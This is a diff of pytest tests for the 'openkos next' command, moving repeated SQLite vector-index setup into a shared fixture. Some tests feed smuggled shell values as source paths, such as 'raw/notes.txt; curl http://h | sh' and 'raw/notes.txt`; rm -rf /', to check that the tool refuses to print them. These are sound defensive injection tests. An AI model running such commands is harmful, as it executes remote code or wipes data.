@@ -9,6 +9,7 @@ and every cost-contract assertion patches a PUBLIC module attribute via
 (design's Testing Strategy).
 """
 
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
@@ -132,25 +133,6 @@ def _write_unextracted_source(
     )
 
 
-def _seed_vector_index(tmp_path: Path) -> None:
-    """Populate `.openkos/vectors.db` so `vector_store_empty` is False,
-    letting evaluation proceed past tier 1."""
-    openkos_dir = tmp_path / ".openkos"
-    openkos_dir.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(openkos_dir / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
-
-
 # --- Phase 1: cost-contract foundation (`_BundleSignals`) -----------------
 
 
@@ -253,12 +235,14 @@ def _spy_walks(
 
 
 def test_tier2_only_path_triggers_exactly_one_bundle_walk(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Stopping at tier 2 performs exactly one bundle walk (spec:
     First-Hit Short-Circuit Cost Contract, "Stopping at tier 2...")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path)
     docs_calls, groups_calls = _spy_walks(monkeypatch)
 
@@ -271,14 +255,16 @@ def test_tier2_only_path_triggers_exactly_one_bundle_walk(
 
 
 def test_tier3_only_path_shares_tier2s_single_bundle_walk(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Stopping at tier 3 shares tier 2's single `collect_docs` call,
     exercised through the real CLI path, not `_BundleSignals` directly
     (spec: First-Hit Short-Circuit Cost Contract, "...sharing tier 2's
     walk")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_below_source_sensitivity_bundle(tmp_path)
     docs_calls, groups_calls = _spy_walks(monkeypatch)
 
@@ -291,14 +277,16 @@ def test_tier3_only_path_shares_tier2s_single_bundle_walk(
 
 
 def test_tier4_path_performs_at_most_three_bundle_walks(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Reaching tier 4 performs at most three bundle walks in total:
     `collect_docs` (1, shared by tiers 2/3) plus `find_exact_title_groups`
     (2 internal walks), spied on together in one run (spec: First-Hit
     Short-Circuit Cost Contract, "Reaching tier 4...")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
     docs_calls, groups_calls = _spy_walks(monkeypatch, real_groups=True)
@@ -314,23 +302,14 @@ def test_tier4_path_performs_at_most_three_bundle_walks(
 
 
 def _seed_all_four_tiers(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, *, vectors_present: bool
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
+    *,
+    vectors_present: bool,
 ) -> None:
     if vectors_present:
-        openkos_dir = tmp_path / ".openkos"
-        openkos_dir.mkdir(parents=True, exist_ok=True)
-        import sqlite3
-
-        conn = sqlite3.connect(str(openkos_dir / "vectors.db"))
-        conn.execute(
-            "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-            "content_hash TEXT NOT NULL)"
-        )
-        conn.execute(
-            "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-        )
-        conn.commit()
-        conn.close()
+        seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path)
     _write_below_source_sensitivity_bundle(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
@@ -338,13 +317,15 @@ def _seed_all_four_tiers(
 
 
 def test_all_four_tiers_present_tier_1_wins(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A bundle carrying all four tier findings at once recommends only
     tier 1's command (spec: Pinned Tier Order, "All four tiers present,
     tier 1 wins")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=False)
+    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=False)
 
     result = runner.invoke(app, ["next"])
 
@@ -356,12 +337,14 @@ def test_all_four_tiers_present_tier_1_wins(
 
 
 def test_tier_2_wins_once_tier_1_is_peeled_off(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """With the vector index present, tier 2 (unextracted source) wins over
     tiers 3 and 4 (spec: "Tier 2 outranks tier 3")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=True)
+    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=True)
 
     result = runner.invoke(app, ["next"])
 
@@ -372,13 +355,15 @@ def test_tier_2_wins_once_tier_1_is_peeled_off(
 
 
 def test_tier_3_wins_once_tiers_1_and_2_are_peeled_off(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """With the vector index present and no unextracted sources, tier 3
     (below-source-sensitivity) wins over tier 4 (spec: "Tier 3 outranks
     tier 4")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=True)
+    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=True)
     for path in (tmp_path / "bundle" / "sources").glob("*.md"):
         if path.stem == "notes":
             path.unlink()
@@ -392,13 +377,15 @@ def test_tier_3_wins_once_tiers_1_and_2_are_peeled_off(
 
 
 def test_tier_4_wins_once_tiers_1_2_3_are_all_peeled_off(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """With every higher tier empty, tier 4 (duplicate groups) wins (spec:
     Duplicate-Group Check Gated on Higher Tiers, "runs only when tiers 1-3
     are all empty")."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=True)
+    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=True)
     for path in (tmp_path / "bundle" / "sources").glob("*.md"):
         if path.stem == "notes":
             path.unlink()
@@ -427,25 +414,14 @@ def test_tier_1_command_is_fixed_reindex(
 
 
 def test_tier_4_command_is_fixed_duplicates(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Tier 4's printed command is exactly `openkos duplicates` regardless
     of finding detail (spec: Per-Tier Command, scenario 4)."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
 
@@ -474,6 +450,7 @@ def test_tier_4_reason_agrees_with_its_own_count(
     monkeypatch: pytest.MonkeyPatch,
     titles: tuple[tuple[str, str], ...],
     expected: str,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Tier 4's reason inflects the noun from its count but hardcoded the
     verb, so a single group read "1 candidate group ... are pending
@@ -481,7 +458,7 @@ def test_tier_4_reason_agrees_with_its_own_count(
     agree; `status` sidesteps this by ending its own line with a command
     instead of a verb (`main.py:5323-5324`)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     concepts_dir = tmp_path / "bundle" / "concepts"
     for index, (first, second) in enumerate(titles):
         _write_doc(concepts_dir / f"dup-{index}a.md", title=first)
@@ -495,25 +472,14 @@ def test_tier_4_reason_agrees_with_its_own_count(
 
 
 def test_tier_2_command_matches_the_findings_own_retry_command(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Tier 2's printed command equals the unextracted-source finding's own
     retry command (spec: Per-Tier Command, scenario 1)."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt")
 
     result = runner.invoke(app, ["next"])
@@ -523,25 +489,14 @@ def test_tier_2_command_matches_the_findings_own_retry_command(
 
 
 def test_tier_3_command_equals_backfill_sensitivity(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Tier 3's printed command equals `openkos backfill-sensitivity` from
     the finding's own detail (spec: Per-Tier Command, scenario 2)."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_below_source_sensitivity_bundle(tmp_path)
 
     result = runner.invoke(app, ["next"])
@@ -554,7 +509,9 @@ def test_tier_3_command_equals_backfill_sensitivity(
 
 
 def test_trap1_multi_source_uncovered_never_surfaces_a_negated_command(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A bundle with only a `multi-source-uncovered` finding (no
     `below-source-sensitivity` finding) never fires tier 3, and never
@@ -562,20 +519,7 @@ def test_trap1_multi_source_uncovered_never_surfaces_a_negated_command(
     `multi-source-uncovered`'s own detail string contains
     (`lint.py:766-768`)."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_multi_source_uncovered_only_bundle(tmp_path)
 
     result = runner.invoke(app, ["next"])
@@ -589,27 +533,16 @@ def test_trap1_multi_source_uncovered_never_surfaces_a_negated_command(
 
 
 def test_trap2_bare_ingest_fallback_never_fires_tier_2(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """When every unextracted finding is the `check_unextracted` empty-
     `resource` fallback (`lint.py:632`), tier 2 declines rather than
     printing the bare, non-runnable `openkos ingest`, and evaluation
     continues to tier 3/4."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -633,7 +566,10 @@ def test_trap2_bare_ingest_fallback_never_fires_tier_2(
     ],
 )
 def test_document_controlled_sensitivity_cannot_dictate_the_printed_command(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, payload: str
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    payload: str,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A document's `sensitivity` frontmatter is stored verbatim and is
     interpolated into the below-source-sensitivity detail BEFORE the command
@@ -641,7 +577,7 @@ def test_document_controlled_sensitivity_cannot_dictate_the_printed_command(
     own verb with an option appended -- may become the line printed after
     `Run:`. Tier 3's command takes no argument, so it is matched exactly."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     sources_dir = tmp_path / "bundle" / "sources"
     sources_dir.mkdir(parents=True, exist_ok=True)
     (sources_dir / "a.md").write_text(
@@ -666,13 +602,15 @@ def test_document_controlled_sensitivity_cannot_dictate_the_printed_command(
 
 
 def test_option_shaped_resource_never_becomes_a_printed_argument(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Tier 2's argument position is for a resource path. A `resource` that
     reads as an option would change what the recommended command does, so it
     is declined rather than printed."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="-rf")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -685,7 +623,9 @@ def test_option_shaped_resource_never_becomes_a_printed_argument(
 
 
 def test_shell_metacharacter_resource_never_becomes_the_printed_command(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A Source's `resource` is stored verbatim from the ingested path, so it
     can carry spaces or shell metacharacters. Tier 2 prints a command only
@@ -693,7 +633,7 @@ def test_shell_metacharacter_resource_never_becomes_the_printed_command(
     continues, because a command that is not runnable as printed is worse
     than no recommendation at all."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt; curl http://h | sh")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -732,12 +672,14 @@ def test_duplicate_group_check_does_not_run_when_tier_1_fires(
 
 
 def test_duplicate_group_check_does_not_run_when_tier_2_fires(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The exact-title-group check does not run when tier 2 already fired
     (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 2)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -757,12 +699,14 @@ def test_duplicate_group_check_does_not_run_when_tier_2_fires(
 
 
 def test_duplicate_group_check_does_not_run_when_tier_3_fires(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The exact-title-group check does not run when tier 3 already fired
     (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 3)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_below_source_sensitivity_bundle(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -782,26 +726,15 @@ def test_duplicate_group_check_does_not_run_when_tier_3_fires(
 
 
 def test_duplicate_group_check_runs_only_when_tiers_1_to_3_are_empty(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The exact-title-group check runs, and `openkos duplicates` is
     recommended, once tiers 1-3 are all empty (spec: Duplicate-Group Check
     Gated on Higher Tiers, scenario 4)."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
     calls = {"n": 0}
@@ -864,13 +797,15 @@ def test_next_rejects_json_flag(
 
 
 def test_next_never_writes_to_the_workspace(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """No file under the workspace is created, modified, or deleted across
     an empty, healthy, and all-tiers-firing run (spec: No mutation on any
     run)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=False)
+    _seed_all_four_tiers(tmp_path, monkeypatch, seed_vectors_db, vectors_present=False)
     before = _snapshot(tmp_path)
 
     result = runner.invoke(app, ["next"])
@@ -880,26 +815,15 @@ def test_next_never_writes_to_the_workspace(
 
 
 def test_next_never_constructs_ollama_client(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """No model backend is constructed on any workspace state, including
     the no-action path (spec: No Model Backend Constructed)."""
     _init_workspace(tmp_path, monkeypatch)
     monkeypatch.setattr("openkos.cli.main.OllamaClient", _RaisingOllamaClient)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
 
     result = runner.invoke(app, ["next"])
 
@@ -907,27 +831,16 @@ def test_next_never_constructs_ollama_client(
 
 
 def test_no_runnable_action_names_status_on_a_truly_empty_bundle(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A freshly initialized workspace with a populated vector index and no
     findings prints a line naming `openkos status`, and no wording claims
     the bundle is clean (spec: No-Runnable-Action Output Never Claims
     Cleanliness, "No ranked tier fires on a truly empty bundle")."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
 
     result = runner.invoke(app, ["next"])
 
@@ -939,7 +852,9 @@ def test_no_runnable_action_names_status_on_a_truly_empty_bundle(
 
 
 def test_no_runnable_action_same_output_despite_commandless_findings(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The same no-runnable-action line appears even when commandless
     findings (a §9 conformance violation) exist in the bundle, because
@@ -947,20 +862,7 @@ def test_no_runnable_action_same_output_despite_commandless_findings(
     No-Runnable-Action Output Never Claims Cleanliness, "No ranked tier
     fires despite commandless findings existing")."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     concepts_dir = tmp_path / "bundle" / "concepts"
     concepts_dir.mkdir(parents=True, exist_ok=True)
     (concepts_dir / "orphan.md").write_text(
@@ -994,7 +896,9 @@ def test_no_count_of_unseen_findings_when_a_tier_fires(
 
 
 def test_no_count_of_unseen_findings_when_tier_4_has_paid_every_walk(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Reaching tier 4 (which has already paid for every walk) still prints
     no numeral describing how many commandless or unranked findings exist,
@@ -1004,20 +908,7 @@ def test_no_count_of_unseen_findings_when_tier_4_has_paid_every_walk(
     allowed -- it describes the finding that fired, not findings `next`
     skipped."""
     _init_workspace(tmp_path, monkeypatch)
-    seed_vectors = tmp_path / ".openkos"
-    seed_vectors.mkdir(parents=True, exist_ok=True)
-    import sqlite3
-
-    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
-    conn.execute(
-        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
-        "content_hash TEXT NOT NULL)"
-    )
-    conn.execute(
-        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
-    )
-    conn.commit()
-    conn.close()
+    seed_vectors_db(tmp_path)
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
     (tmp_path / "bundle" / "concepts" / "orphan.md").write_text(
@@ -1037,7 +928,9 @@ def test_no_count_of_unseen_findings_when_tier_4_has_paid_every_walk(
 
 
 def test_backtick_in_resource_never_becomes_a_truncated_printed_path(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A Source's `resource` is interpolated verbatim INSIDE the retry
     hint's backtick span (`lint.py:630`), so a `resource` carrying a
@@ -1046,7 +939,7 @@ def test_backtick_in_resource_never_becomes_a_truncated_printed_path(
     than the finding is about, which is the one thing tier 2 must never
     print (issue #274). Declining hands the run to tier 4."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt`; rm -rf /")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -1060,7 +953,9 @@ def test_backtick_in_resource_never_becomes_a_truncated_printed_path(
 
 
 def test_balanced_backticks_in_resource_are_declined_too(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The truncation is not detectable by counting backticks. A `resource`
     carrying TWO of them leaves the detail's total count EVEN and still
@@ -1068,7 +963,7 @@ def test_balanced_backticks_in_resource_are_declined_too(
     therefore corroborate the extracted argument against the document's own
     `resource`, not against the span's shape (issue #274)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/a`x`b.txt")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
     _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
@@ -1081,13 +976,15 @@ def test_balanced_backticks_in_resource_are_declined_too(
 
 
 def test_an_intact_resource_still_fires_tier_2_verbatim(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """The corroboration closing #274 must not cost tier 2 its normal
     behaviour: an ordinary `resource` still produces the finding's own
     retry command, character for character."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt")
 
     result = runner.invoke(app, ["next"])
@@ -1110,7 +1007,9 @@ def _write_unparseable_doc(tmp_path: Path, name: str = "broken") -> None:
 
 
 def test_skip_notices_are_named_on_the_no_action_path(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A document excluded from `docs` exists ONLY as a skip notice, so a
     run that discards the notices reports "no ranked action" over a bundle
@@ -1118,7 +1017,7 @@ def test_skip_notices_are_named_on_the_no_action_path(
     `collect_docs` documents as the exact failure it exists to prevent
     (issue #275)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unparseable_doc(tmp_path)
 
     result = runner.invoke(app, ["next"])
@@ -1130,14 +1029,16 @@ def test_skip_notices_are_named_on_the_no_action_path(
 
 
 def test_skip_notices_are_named_even_when_a_tier_fires(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """A damaged bundle can also produce a ranked action, and that action is
     then derived from a document set that is knowingly incomplete. The
     notices are emitted on that path too, exactly as `_STATUS_POINTER` is
     (D4: the honesty guard holds on every path)."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
     _write_unextracted_source(tmp_path, resource="raw/notes.txt")
     _write_unparseable_doc(tmp_path)
 
@@ -1149,12 +1050,14 @@ def test_skip_notices_are_named_even_when_a_tier_fires(
 
 
 def test_every_skipped_document_is_named_not_just_the_first(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    seed_vectors_db: Callable[[Path], None],
 ) -> None:
     """Each skipped document names a separate file to go and look at, so a
     count alone -- or the first one only -- would leave the rest invisible."""
     _init_workspace(tmp_path, monkeypatch)
-    _seed_vector_index(tmp_path)
+    seed_vectors_db(tmp_path)
